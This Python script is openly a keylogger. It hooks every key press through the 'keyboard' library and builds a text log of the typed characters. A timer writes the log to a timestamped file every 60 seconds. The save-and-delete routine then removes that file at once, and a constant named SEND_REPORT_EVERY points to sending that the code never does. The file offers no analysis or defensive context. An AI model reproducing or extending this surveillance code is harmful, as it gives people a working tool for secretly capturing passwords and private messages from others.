#!/usr/bin/env python
import keyboard
import os
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.filename = f"keylog-{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}.txt"

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == "space":
                self.log += " "
            elif event.name == "enter":
                self.log += "[ENTER]\n"
            elif len(event.name) == 1:
                self.log += event.name
            else:
                self.log += f"[{event.name.upper()}]"

    def report(self):
        if self.log:
            with open(self.filename, "w") as f:
                f.write(self.log)
            print(f"[+] Saved {self.filename}")
            self.delete_file(self.filename)
            self.start_dt = datetime.now()
        self.log = ""
        Timer(self.interval, self.report).start()

    def delete_file(self, filename):
        os.remove(filename)
        print(f"[+] Deleted {filename}")

    def start(self):
        keyboard.on_press(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started Keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
